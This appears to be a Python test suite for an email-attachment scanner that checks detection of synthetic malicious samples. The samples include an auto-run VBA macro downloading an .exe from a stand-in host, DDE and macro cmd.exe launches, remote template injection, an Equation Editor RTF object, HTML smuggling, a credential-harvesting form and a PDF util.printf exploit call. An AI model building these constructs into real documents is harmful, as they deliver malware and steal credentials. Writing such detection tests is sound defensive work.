"""Attachments read for what they do when opened, safely, the way a sandbox's
static analysis reads them.

Only a PDF's insides were read, and in the same process as everything else:
a parser bug in reading a file written by an attacker would have been a bug
in DomainLens itself. Every attachment is now read in a process of its own
with no network, no environment and limits on time and memory, and what is
read goes further: macros and whether they run on opening, a template
fetched from the internet, DDE, the Equation Editor object of
CVE-2017-11882, what is inside archives (a program, a password, a ZIP
bomb), HTML smuggling and login forms, names that hide their extension,
and the hash asked of MalwareBazaar and VirusTotal -- the hash only.

Samples are built here from their parts; no real malware is in the
repository, and none is needed: the structures are what is recognised.
"""

import io
import struct
import time
import unittest
import zipfile
from unittest import mock

import cfb_writer
import file_reputation
import file_scan
import mail_test
import sandbox
from test_mail_test import FakeLookups, _message, _public, _titles


def _titles_of(result):
    return {f[1]: f[0] for _p, node in file_scan.flatten(result) for f in node["findings"]}


def _zip(members, cls=zipfile.ZipFile):
    buf = io.BytesIO()
    with cls(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in members.items():
            z.writestr(name, data)
    return buf.getvalue()


def _vba_container(text):
    """[MS-OVBA] compression with literal tokens only: valid, and enough to
    carry a module's source."""
    data = text.encode("latin-1")
    out = bytearray(b"\x01")
    for start in range(0, len(data), 4096):
        chunk = data[start:start + 4096]
        body = bytearray()
        for i in range(0, len(chunk), 8):
            body.append(0)
            body += chunk[i:i + 8]
        out += struct.pack("<H", 0xB000 | (len(body) + 2 - 3)) + body
    return bytes(out)


def _macro_ole(source):
    """An OLE file with a VBA module, as Word keeps one in vbaProject.bin."""
    module = b"\x00" * 40 + _vba_container('Attribute VB_Name = "ThisDocument"\r\n' + source)
    return cfb_writer.build({"VBA/ThisDocument": module, "VBA/dir": b"\x01\x00\x00", "PROJECT": b"ID=x"})


def _docx(extra):
    members = {"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>"}
    members.update(extra)
    return _zip(members)


class TypeAndNameTests(unittest.TestCase):
    def test_a_program_named_pdf_is_called_a_program(self):
        found = _titles_of(file_scan.scan(b"MZ" + b"\x00" * 200, "invoice.pdf"))
        self.assertEqual("high", found["A program disguised as a document"])
        self.assertEqual("high", found["A program or script is attached"])

    def test_a_right_to_left_mark_in_a_name_is_named(self):
        found = _titles_of(file_scan.scan(b"MZ", "invoice\u202efdp.exe"))
        self.assertIn("A file name is written right-to-left to hide its type", found)

    def test_a_double_extension_is_named(self):
        self.assertIn("A program named like a document", _titles_of(file_scan.scan(b"MZ", "scan.pdf.exe")))

    def test_an_ordinary_document_has_nothing_to_say(self):
        result = file_scan.scan(_docx({}), "report.docx")
        self.assertEqual(("ooxml", "scanned", []), (result["type"], result["state"], result["findings"]))

    def test_the_hashes_are_given(self):
        result = file_scan.scan(b"hello", "a.txt")
        self.assertEqual("2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824", result["sha256"])


class OfficeTests(unittest.TestCase):
    def test_vba_decompression_matches_the_specification(self):
        normal = bytes.fromhex("012FB000236161616263646582660070616768696A013808616B6C00306D6E6F70"
                               "067102700410727374757610777879" "7A003C")
        self.assertEqual(b"#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa",
                         file_scan.ovba_decompress(normal))

    def test_macros_that_run_on_opening_and_download_are_high(self):
        source = 'Sub AutoOpen()\r\n  Set x = CreateObject("MSXML2.XMLHTTP")\r\n  x.Open "GET", "http://dl.example.net/a.exe"\r\nEnd Sub\r\n'
        result = file_scan.scan(_docx({"word/vbaProject.bin": _macro_ole(source)}), "invoice.docm")
        found = _titles_of(result)
        self.assertEqual("high", found["Macros that run when the document is opened"])
        self.assertIn("AutoOpen", result["macros"]["auto_run"])
        self.assertIn("http://dl.example.net/a.exe", result["urls"])

    def test_macros_in_an_older_word_file_are_read_too(self):
        result = file_scan.scan(_macro_ole("Sub Document_Open()\r\n Shell \"cmd.exe /c calc\"\r\nEnd Sub\r\n"), "letter.doc")
        self.assertEqual("ole", result["type"])
        self.assertIn("Macros that run when the document is opened", _titles_of(result))

    def test_a_template_fetched_from_the_internet_is_high(self):
        rels = ('<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
                'relationships/attachedTemplate" Target="https://tpl.example.net/t.dotm" TargetMode="External"/>'
                '</Relationships>')
        found = _titles_of(file_scan.scan(_docx({"word/_rels/settings.xml.rels": rels}), "cv.docx"))
        self.assertEqual("high", found["A document fetches its template from the internet"])

    def test_a_dde_field_is_high(self):
        doc = '<w:document><w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:document>'
        found = _titles_of(file_scan.scan(_docx({"word/document.xml": doc}), "order.docx"))
        self.assertEqual("high", found["A document runs a command through DDE"])

    def test_an_encrypted_office_file_is_partly_read(self):
        result = file_scan.scan(cfb_writer.build({"EncryptionInfo": b"x" * 10, "EncryptedPackage": b"y" * 100}), "pay.xlsx")
        self.assertEqual("partial", result["state"])
        self.assertIn("A password-protected Office document", _titles_of(result))

    def test_an_excel_4_macro_sheet_is_found_by_its_record(self):
        sheet = struct.pack("<HH", 0x0809, 4) + b"\x00" * 4 + struct.pack("<HH", 0x0085, 8) + b"\x00" * 4 + b"\x00\x01Ma"
        found = _titles_of(file_scan.scan(cfb_writer.build({"Workbook": sheet}), "book.xls"))
        self.assertIn("An Excel 4.0 macro sheet", found)
        # A worksheet (type 0) with the same bytes elsewhere is not one.
        plain = struct.pack("<HH", 0x0809, 4) + b"\x00" * 4 + struct.pack("<HH", 0x0085, 8) + b"\x00" * 4 + b"\x01\x00Ma"
        self.assertNotIn("An Excel 4.0 macro sheet", _titles_of(file_scan.scan(cfb_writer.build({"Workbook": plain}), "b.xls")))


class RtfTests(unittest.TestCase):
    def test_the_equation_editor_object_is_critical(self):
        rtf = b"{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata 0105000002000000}}}"
        found = _titles_of(file_scan.scan(rtf, "doc.rtf"))
        self.assertEqual("critical", found["An RTF document with an Equation Editor object"])
        self.assertEqual("high", found["An RTF document with embedded objects"])


class ArchiveTests(unittest.TestCase):
    def test_a_program_in_an_archive_and_what_else_is_inside(self):
        html = b'<html><form action="https://collect.example.net/p"><input type="password" name="p"></form></html>'
        result = file_scan.scan(_zip({"invoice.pdf.exe": b"MZ" + b"\x00" * 64, "login.html": html}), "docs.zip")
        found = _titles_of(result)
        self.assertEqual("high", found["An archive holds a program"])
        self.assertEqual("high", found["An attachment asks for a password"])
        self.assertEqual(["invoice.pdf.exe", "login.html"], [c["name"] for c in result["children"]])

    def test_a_password_protected_archive_is_partly_read(self):
        data = bytearray(_zip({"a.exe": b"MZ"}))
        # Set the "encrypted" flag on the local and central headers.
        for sig in (b"PK\x03\x04", b"PK\x01\x02"):
            at = data.find(sig)
            off = 6 if sig == b"PK\x03\x04" else 8
            data[at + off] |= 1
        result = file_scan.scan(bytes(data), "scan.zip")
        self.assertEqual("partial", result["state"])
        self.assertIn("A password-protected archive", _titles_of(result))

    def test_a_zip_bomb_is_named_and_not_unpacked(self):
        with mock.patch.object(file_scan, "MAX_UNPACKED", 1024 * 1024):
            result = file_scan.scan(_zip({"big.txt": b"\x00" * (8 * 1024 * 1024)}), "bomb.zip")
        self.assertIn("An archive that unpacks to far more than it is (a ZIP bomb)", _titles_of(result))
        self.assertEqual([], result["children"])

    def test_nesting_stops_at_its_depth(self):
        inner = _zip({"a.exe": b"MZ"})
        for n in range(5):
            inner = _zip({f"level{n}.zip": inner})
        depths = [node["depth"] for _p, node in file_scan.flatten(file_scan.scan(inner, "nest.zip"))]
        self.assertLessEqual(max(depths), file_scan.MAX_DEPTH)


class HtmlTests(unittest.TestCase):
    def test_html_smuggling_is_high(self):
        page = (b"<html><script>var d=atob('TVo=');var b=new Blob([d]);var a=document.createElement('a');"
                b"a.href=URL.createObjectURL(b);a.download='x.exe';a.click();</script></html>")
        self.assertEqual("high", _titles_of(file_scan.scan(page, "fax.html"))["HTML smuggling: a file assembled in the browser"])


class PdfInsideTests(unittest.TestCase):
    def test_a_known_exploit_call_is_critical_and_a_file_inside_is_looked_into(self):
        import zlib
        js = b"<< /S /JavaScript /JS (var x = util.printf('%45000f', 1);) >>"
        packed = zlib.compress(b"MZ" + b"\x00" * 64)
        pdf = (b"%PDF-1.7\n1 0 obj\n" + js + b"\nendobj\n2 0 obj\n<< /Filter /FlateDecode >>\nstream\n"
               + packed + b"\nendstream\nendobj\n%%EOF")
        result = file_scan.scan(pdf, "doc.pdf")
        found = _titles_of(result)
        self.assertEqual("critical", found["A PDF calls JavaScript used by known exploits"])
        self.assertEqual("pe", result["children"][0]["type"])


class HostileInputTests(unittest.TestCase):
    """A file written to make the reader slow or blind is still read, and
    read quickly enough."""

    def test_parentheses_inside_javascript_do_not_end_it(self):
        """The string ended at the first ")", so util.printf('%f', 1) hid
        the launchURL after it."""
        js = b"<< /OpenAction << /S /JavaScript /JS (var x = util.printf('%f', 1); app.launchURL('https://x.example.net/');) >> >>"
        result = file_scan.scan(b"%PDF-1.7\n1 0 obj\n" + js + b"\nendobj\n%%EOF", "a.pdf")
        self.assertIn("app.launchURL (opens a web address)", result["pdf"]["js"]["dropper"])
        self.assertIn("https://x.example.net/", result["urls"])

    def test_floods_of_structure_are_read_in_bounded_time(self):
        floods = [(b"%PDF-1.7\n" + b"/JS (" * 2_000_000, "a.pdf"),
                  (b"%PDF-1.7\n" + b"stream\n" * 500_000 + b"endstream", "b.pdf"),
                  (b"<html>" + b"<input " * 1_000_000, "c.html")]
        for data, name in floods:
            started = time.monotonic()
            file_scan.scan(data, name)
            self.assertLess(time.monotonic() - started, 20, name)


class SandboxTests(unittest.TestCase):
    def test_files_are_read_in_a_process_of_their_own(self):
        results = sandbox.scan_files([("a.exe", b"MZ" + b"\x00" * 64), ("b.txt", b"hello")])
        self.assertEqual(["pe", "text"], [r["type"] for r in results])

    def test_a_worker_that_does_not_finish_leaves_the_files_unmeasured(self):
        with mock.patch.object(sandbox.subprocess, "run", side_effect=sandbox.subprocess.TimeoutExpired("x", 45)):
            results = sandbox.scan_files([("a.pdf", b"%PDF-1.7")])
        self.assertEqual("unmeasured", results[0]["state"])
        self.assertIn("45 seconds", results[0]["reason"])
        self.assertTrue(results[0]["sha256"])

    def test_the_worker_gets_no_environment(self):
        with mock.patch.dict("os.environ", {"VIRUSTOTAL_API_KEY": "secret", "DOMAINLENS_DB": "x"}):
            env = sandbox._env()
        self.assertNotIn("VIRUSTOTAL_API_KEY", env)
        self.assertNotIn("DOMAINLENS_DB", env)

    def test_the_worker_cannot_reach_the_network(self):
        import scan_worker
        with self.assertRaises(OSError):
            scan_worker._no_network("example.net", 443)

    def test_an_outlook_message_is_converted_in_the_worker(self):
        raw, info = sandbox.convert_msg(cfb_writer.msg(headers="From: a@example.org\r\nSubject: x\r\n", body="Hi"))
        self.assertTrue(info["headers"])
        self.assertIn(b"From: a@example.org", raw)


class ReputationTests(unittest.TestCase):
    def test_only_the_hash_is_asked_of_malwarebazaar(self):
        sent = {}

        def post(url, data, headers):
            sent.update(data)
            resp = mock.Mock(status_code=200)
            resp.json.return_value = {"query_status": "ok", "data": [{"signature": "ExampleStealer", "tags": ["exe"]}]}
            resp.raise_for_status = mock.Mock()
            return resp

        result = file_reputation._malwarebazaar("ab" * 32, "key", post=post)
        self.assertEqual({"query": "get_info", "hash": "ab" * 32}, sent)
        self.assertEqual(("listed", "ExampleStealer"), (result["state"], result["signature"]))

    def test_with_nothing_set_up_nothing_is_said_to_be_checked(self):
        """Every file read "not known" while no service had been asked."""
        import link_check
        from settings import api_keys
        with mock.patch.object(api_keys, "resolve", return_value=""), \
             mock.patch.object(link_check, "virustotal_state", return_value="off"):
            self.assertIsNone(file_reputation.check(["ab" * 32]))


class ContentNeverLeavesTests(unittest.TestCase):
    """A customer's PDF must not end up at a cloud service. Uploading a file
    to VirusTotal publishes it to everyone with an account there; only the
    hash of a file may ever leave this server, and only to ask about it."""

    SECRET = b"%PDF-1.7\n% customer record: account 12345678, Example Customer\n%%EOF"

    def test_the_code_that_reads_files_has_no_way_to_send_them(self):
        import pathlib
        root = pathlib.Path(file_scan.__file__).parent
        for module in ("file_scan.py", "pdf_scan.py", "msg_file.py", "scan_worker.py", "sandbox.py"):
            source = (root / module).read_text(encoding="utf-8")
            for way in ("import requests", "urllib.request", "http.client", "smtplib", "ftplib"):
                self.assertNotIn(way, source, module)

    def test_only_the_hash_is_sent_and_virustotal_is_only_read(self):
        import hashlib
        import link_check
        import rate_limits
        from settings import api_keys
        digest = hashlib.sha256(self.SECRET).hexdigest()
        calls = []

        def record(method):
            def call(url, *args, **kwargs):
                calls.append((method, url, repr(args) + repr(kwargs)))
                resp = mock.Mock(status_code=404)
                resp.json.return_value = {"query_status": "hash_not_found"}
                resp.raise_for_status = mock.Mock()
                return resp
            return call

        with mock.patch.object(api_keys, "resolve", return_value="key"), \
             mock.patch.object(link_check, "virustotal_state", return_value="on"), \
             mock.patch.object(link_check, "_vt_cached", return_value=None), \
             mock.patch.object(link_check, "_vt_store"), \
             mock.patch.object(rate_limits, "acquire", return_value=(True, None)), \
             mock.patch.object(file_reputation.requests, "get", side_effect=record("GET")), \
             mock.patch.object(file_reputation.requests, "post", side_effect=record("POST")):
            file_reputation.check([digest])
        self.assertTrue(calls)
        for method, url, sent in calls:
            self.assertNotIn("customer record", sent)
            self.assertNotIn("customer record", url)
            if "virustotal" in url:
                self.assertEqual(("GET", f"https://www.virustotal.com/api/v3/files/{digest}"), (method, url))
            else:
                self.assertIn(digest, sent)

    @mock.patch.object(mail_test, "_public", _public)
    def test_the_analysis_hands_out_hashes_and_links_never_the_file(self):
        handed = []

        class Recording(FakeLookups):
            def scan_files(self, files):
                return [file_scan.scan(d, n) for n, d in files]

            def check_hashes(self, digests):
                handed.append(repr(digests))
                return None

            def check_links(self, urls):
                handed.append(repr(urls))
                return super().check_links(urls)

        pdf = self.SECRET.replace(b"%%EOF", b"<< /URI (https://portal.example.net/) >>\n%%EOF")
        mail_test.analyse_file(pdf, "statement.pdf", lookups=Recording())
        self.assertTrue(handed)
        self.assertFalse([h for h in handed if "customer record" in h])


class _Known(FakeLookups):
    def scan_files(self, files):
        return [file_scan.scan(d, n) for n, d in files]

    def check_hashes(self, digests):
        return {d: {"malwarebazaar": {"state": "listed", "signature": "ExampleStealer"},
                    "virustotal": {"state": "not_configured"}} for d in digests}


@mock.patch.object(mail_test, "_public", _public)
class MailTests(unittest.TestCase):
    def _with(self, name, data, lookups):
        import email.message
        part = email.message.EmailMessage()
        part.set_content("See attached.")
        part.add_attachment(data, maintype="application", subtype="octet-stream", filename=name)
        body = part.as_bytes().split(b"\n\n", 1)[1].decode()
        return mail_test.analyse(_message(sign=False, content_type=part["Content-Type"], body=body), lookups=lookups)

    def test_known_malware_by_hash_is_critical_and_found_inside_an_archive(self):
        result = self._with("docs.zip", _zip({"a.exe": b"MZ" + b"\x00" * 64}), _Known())
        severity = {f["title"]: f["severity"] for f in result["findings"]}
        self.assertEqual("critical", severity["An attachment is known malware"])
        self.assertTrue(any("Inside docs.zip" in f["detail"] for f in result["findings"]
                            if f["title"] == "A program or script is attached"))

    def test_an_attachment_the_sandbox_could_not_read_says_so(self):
        class Stopped(FakeLookups):
            def scan_files(self, files):
                return [sandbox._unmeasured(n, d, "The scan was stopped after 45 seconds.") for n, d in files]
        result = self._with("big.pdf", b"%PDF-1.7", Stopped())
        self.assertIn("An attachment could not be scanned", _titles(result))


if __name__ == "__main__":
    unittest.main()
